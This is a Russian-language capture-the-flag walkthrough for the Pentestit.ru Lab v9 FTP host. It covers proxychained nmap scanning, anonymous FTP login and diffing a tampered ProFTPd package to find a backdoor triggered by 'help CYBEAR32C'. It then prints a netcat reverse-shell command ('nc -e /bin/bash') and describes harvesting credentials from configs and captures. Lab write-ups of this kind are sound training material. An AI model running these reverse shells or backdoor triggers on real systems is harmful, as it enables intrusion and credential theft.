## Получение флага FTP в лаборатории Pentestit.ru Lab v 9

Нашей следующей целью является FTP. Чтобы понять, куда дальше двигаться, нам нужно получить возможности, которые у нас есть на фтп. 

![VirtualBox_Kali2016.2_21_09_2016_00_04_37](https://github.com/CyberLight/writeups/blob/master/PENTESTIT.RU_LAB_9/FTP/imgs/VirtualBox_Kali2016.2_21_09_2016_00_04_37.png)

Просканируем этот хост посредством nmap через proxychains, выполним команду proxychains `nmap -sT -PN -n -sV 172.16.0.4` . Результат сканирования дал нам следующее:

![VirtualBox_Kali2016.2_21_09_2016_00_06_59](https://github.com/CyberLight/writeups/blob/master/PENTESTIT.RU_LAB_9/FTP/imgs/VirtualBox_Kali2016.2_21_09_2016_00_06_59.png)

У нас открыты порты 21 и 22, нас конечно же интересует порт 21, выбор у нас тут не большой. Пробуем использовать пароли, которые мы получили из бекапа паролей прокси ранее, для входа на ftp. Увы, ни один не подходит. Тогда пробуем найти какой-то эксплоит для версии ProFTPd, но увы все выглядит так, как будто дырки пропатчены. Остается анонимный вход. Пробуем - вводим команду `proxychains ftp -p 172.16.0.4` и, в качестве логина вводим anonymous, и радуемся сообщению системы, что анонимный доступ разрешен, вводим любой пароль и входим на ftp. 

![VirtualBox_Kali2016.2_20_09_2016_21_59_57](https://github.com/CyberLight/writeups/blob/master/PENTESTIT.RU_LAB_9/FTP/imgs/VirtualBox_Kali2016.2_20_09_2016_21_59_57.png)

Далее нам нужно осмотреться и понять, что у нас имеется в нашем распоряжении.  

![VirtualBox_Kali2016.2_20_09_2016_22_00_55](https://github.com/CyberLight/writeups/blob/master/PENTESTIT.RU_LAB_9/FTP/imgs/VirtualBox_Kali2016.2_20_09_2016_22_00_55.png)

И нашему вниманию предстает папка `dist`. Заглянем в нее!

![VirtualBox_Kali2016.2_20_09_2016_22_01_41](https://github.com/CyberLight/writeups/blob/master/PENTESTIT.RU_LAB_9/FTP/imgs/VirtualBox_Kali2016.2_20_09_2016_22_01_41.png)

А в ней deb пакет и архив с дистрибутивом proftpd. Вот спросите вы: "А зачем тут лежат эти файлы?". Меня это тоже удивило. Думаю на них стоит взглянуть, нет ли в этих дистрибутивах каких либо изменений. 

Скачиваем эти дистрибутивы. Посредством `proxychains` это очень легко, так как работают все команды ftp, как будто мы внутри сети. Так что, воспользовавшись командой get название_файла (этих команд придется выполнить 2), выкачиваем сразу на свою машину эти два файла. 

![VirtualBox_Kali2016.2_20_09_2016_22_02_27](https://github.com/CyberLight/writeups/blob/master/PENTESTIT.RU_LAB_9/FTP/imgs/VirtualBox_Kali2016.2_20_09_2016_22_02_27.png)

Но для того чтобы сравнить и найти изменения в файлах, нужно скачать аналогичный пакет с официальных репо.  ![VirtualBox_Kali2016.2_20_09_2016_22_07_40](https://github.com/CyberLight/writeups/blob/master/PENTESTIT.RU_LAB_9/FTP/imgs/VirtualBox_Kali2016.2_20_09_2016_22_07_40.png)

Проходимся по скачанным файлам binwalk, убеждаемся, что это архивы и deb пакет. 

![VirtualBox_Kali2016.2_20_09_2016_22_11_35](https://github.com/CyberLight/writeups/blob/master/PENTESTIT.RU_LAB_9/FTP/imgs/VirtualBox_Kali2016.2_20_09_2016_22_11_35.png)

Качаем оригинальный proftpd версии  1.3.5 - конечно же сам архив с исходниками весит намного меньше того файла что мы получили с ftp.

![VirtualBox_Kali2016.2_20_09_2016_22_13_30](https://github.com/CyberLight/writeups/blob/master/PENTESTIT.RU_LAB_9/FTP/imgs/VirtualBox_Kali2016.2_20_09_2016_22_13_30.png)

Кладем в одну папку оба файла и распаковываем их. После распаковки в дело вступает binwally - очень удобный инструмент для поиска различий в файлах, написанный на python. Репозиторий тут https://github.com/bmaia/binwally

 ![VirtualBox_Kali2016.2_20_09_2016_23_49_50](https://github.com/CyberLight/writeups/blob/master/PENTESTIT.RU_LAB_9/FTP/imgs/VirtualBox_Kali2016.2_20_09_2016_23_49_50.png)

Выполняем команду python `binwally.py ~/PENTESTIT/analyze/proftpd-dfsg-1.3.5_orig ~/PENTESTIT/analyze/proftpd-dfsg-1.3.5_pentestit/ | grep -E -v "ignored|matches|unique"`  и получаем небольшой список отличающихся файлов и, используя diff, просматриваем по аналогичным путям обе версии файла. Просморев так много файлов, я наткнулся на изменения в help.c и, сравнив два файла, понял что искал именно это, так как в строке присутствовало название организации большими буквами (потом узнал, что другие искали по названию организации используя grep). Но в мою голову такая мысль не пришла, и я сделал все как делают люди при анализе изменений, без всякого читерства и предположений.

![VirtualBox_Kali2016.2_20_09_2016_22_44_34](https://github.com/CyberLight/writeups/blob/master/PENTESTIT.RU_LAB_9/FTP/imgs/VirtualBox_Kali2016.2_20_09_2016_22_44_34.png)

Тут видно, что при вводе команды CYBEAR32C как аргумент для команды help при соединении к ftp можно получить доступ к шеллу. Хм, забавно запрятан бекдор, подумал я. И решил взглянуть на окружаюшие строки в help.c.

![VirtualBox_Kali2016.2_20_09_2016_22_46_05](https://github.com/CyberLight/writeups/blob/master/PENTESTIT.RU_LAB_9/FTP/imgs/VirtualBox_Kali2016.2_20_09_2016_22_46_05.png)

Открываем vim сразу на нужной строке 131, которая фигурирует в diff. 

![VirtualBox_Kali2016.2_20_09_2016_22_46_31](https://github.com/CyberLight/writeups/blob/master/PENTESTIT.RU_LAB_9/FTP/imgs/VirtualBox_Kali2016.2_20_09_2016_22_46_31.png)

Вот измененный пакет и тут присутствует эта строка, а ниже представлен оригинальный код.

![VirtualBox_Kali2016.2_20_09_2016_22_47_38](https://github.com/CyberLight/writeups/blob/master/PENTESTIT.RU_LAB_9/FTP/imgs/VirtualBox_Kali2016.2_20_09_2016_22_47_38.png)

Как видим строка отсутствует. Значит мы на правильном пути. Да уж, очень интересно! Пробуем подконнектиться посредством telnet на 21 порт, так как тут также есть возможность работы через telnet соединение. Набираем команду `proxychains telnet 172.16.0.4 21` и попадаем на ftp. Теперь нам нужно проинспектировать работу команды `help CYBEAR32C`. 

![VirtualBox_Kali2016.2_20_09_2016_22_53_44](https://github.com/CyberLight/writeups/blob/master/PENTESTIT.RU_LAB_9/FTP/imgs/VirtualBox_Kali2016.2_20_09_2016_22_53_44.png)

Пытаемся набрать просто команду `CYBEAR32C`, но она без help не срабатывает. Тогда набираем команду `help CYBEAR32C` и наблюдаем очень странную картину. Вроде как очень похоже на шелл, но при вводе команд не получается увидеть результата, т.е. вывода нет. Значит нам нужно попытаться при помощи nc организовать нормальный шелл. Для этого выпоним следующие действия:

![VirtualBox_Kali2016.2_20_09_2016_23_32_19](https://github.com/CyberLight/writeups/blob/master/PENTESTIT.RU_LAB_9/FTP/imgs/VirtualBox_Kali2016.2_20_09_2016_23_32_19.png)

 На машине ssh запускаем слушатель `nc -vlp 8989`, а из шелл запускаем команду `nc -e /bin/bash 172.16.0.2 8989`. И у нас все получается с первого раза. Теперь у нас есть полноценный шелл и бекдор, заложенный в ProFTPd, работает!

![VirtualBox_Kali2016.2_20_09_2016_23_31_39](https://github.com/CyberLight/writeups/blob/master/PENTESTIT.RU_LAB_9/FTP/imgs/VirtualBox_Kali2016.2_20_09_2016_23_31_39.png)

Теперь как видим при вводе команды, вывод получается нормально! Остается просмотреть файлы и определиться с содержимым, а также найти флаг!

![VirtualBox_Kali2016.2_20_09_2016_23_33_02](https://github.com/CyberLight/writeups/blob/master/PENTESTIT.RU_LAB_9/FTP/imgs/VirtualBox_Kali2016.2_20_09_2016_23_33_02.png)

Проходим по папкам и видим, что есть интересные папки, в которых можно поискать полезную информацию.  

![VirtualBox_Kali2016.2_20_09_2016_23_35_11](https://github.com/CyberLight/writeups/blob/master/PENTESTIT.RU_LAB_9/FTP/imgs/VirtualBox_Kali2016.2_20_09_2016_23_35_11.png)

К текущему моменту, когда я пишу прохождение, в папке уже куча файлов созданных участниками. Но целевыми файлами тут являются `router-config.old` и `trouble.cap`.

![VirtualBox_Kali2016.2_20_09_2016_23_35_34](https://github.com/CyberLight/writeups/blob/master/PENTESTIT.RU_LAB_9/FTP/imgs/VirtualBox_Kali2016.2_20_09_2016_23_35_34.png)

Выполняем команду cat router-config.old и просматриваем содержимое файла.

![VirtualBox_Kali2016.2_20_09_2016_23_36_52](https://github.com/CyberLight/writeups/blob/master/PENTESTIT.RU_LAB_9/FTP/imgs/VirtualBox_Kali2016.2_20_09_2016_23_36_52.png)

Ниже замечаем пароль и логин пользователя. 

![VirtualBox_Kali2016.2_20_09_2016_23_37_17](https://github.com/CyberLight/writeups/blob/master/PENTESTIT.RU_LAB_9/FTP/imgs/VirtualBox_Kali2016.2_20_09_2016_23_37_17.png)

Эти данные нам возможно пригодятся в будущем, но пока идем далее и продолжаем собирать информацию. Смотрим, что же может быть интересного в trouble.cap и видим также логин и пароль пользователя `m.barry`, запоминаем, записываем, складываем в отдельный документ все что нашли для будущего использования.

![VirtualBox_Kali2016.2_20_09_2016_23_41_52](https://github.com/CyberLight/writeups/blob/master/PENTESTIT.RU_LAB_9/FTP/imgs/VirtualBox_Kali2016.2_20_09_2016_23_41_52.png)

В этом дампе видим некое перемещение скрипта на python, пока что нет предположений, для чего это нужно.

![VirtualBox_Kali2016.2_20_09_2016_23_43_16](https://github.com/CyberLight/writeups/blob/master/PENTESTIT.RU_LAB_9/FTP/imgs/VirtualBox_Kali2016.2_20_09_2016_23_43_16.png)

Идем дальше. Заходим в папку old, смотрим содержимое файла ftp_test.txt и видим наш заветный флаг от FTP. Идем и фиксируем получение флага в профиле! И так у нас есть доступ к ftp, а также логин и пароль для доступа на роутер, но мы уже и так получили флаг CISCO. Так что эти данные могут нам пригодиться в других направлениях.

![VirtualBox_Kali2016.2_20_09_2016_23_45_23](https://github.com/CyberLight/writeups/blob/master/PENTESTIT.RU_LAB_9/FTP/imgs/VirtualBox_Kali2016.2_20_09_2016_23_45_23.png)

